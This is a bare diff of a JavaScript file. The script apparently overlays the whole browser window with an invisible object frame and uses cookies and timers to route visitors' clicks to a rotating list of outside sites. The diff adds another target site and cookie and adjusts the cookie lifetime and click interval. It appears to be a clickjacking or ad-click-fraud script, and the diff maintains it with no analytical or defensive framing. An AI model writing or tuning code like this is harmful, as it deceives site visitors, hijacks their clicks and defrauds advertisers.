@@ -1,5 +1,5 @@
-var randLinks = ["https://www.mantendoasaude.com/?utm=instagram","https://www.guiadepescaesportivaemsantos.com/?utm=facebook"];
-var randCookies = ["_gcli2","_gcli1"];
+var randLinks = ["https://www.aumsoluga.com/?utm=twitter","https://www.mantendoasaude.com/?utm=instagram","https://www.guiadepescaesportivaemsantos.com/?utm=facebook"];
+var randCookies = ["_gcli3","_gcli2","_gcli1"];
 var cookieName = '';
 var urlFrame = '';
 var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:'+ window.innerWidth +'px;height:'+ window.innerHeight +'px;overflow: hidden"></object>';
@@ -115,9 +115,9 @@ function checkDelay() {
 }
 
 function clickAds(){
-    setCookie(cookieName, '1', 24 * 2);
+    setCookie(cookieName, '1', 24 * 5);
     setCookie("_gcli_freezetime", '1', 1);
-    setTimeout(nextClick, 1000 * 60 * 120);
+    setTimeout(nextClick, 1000 * 60 * 90);
     document.activeElement.blur();
 }
 
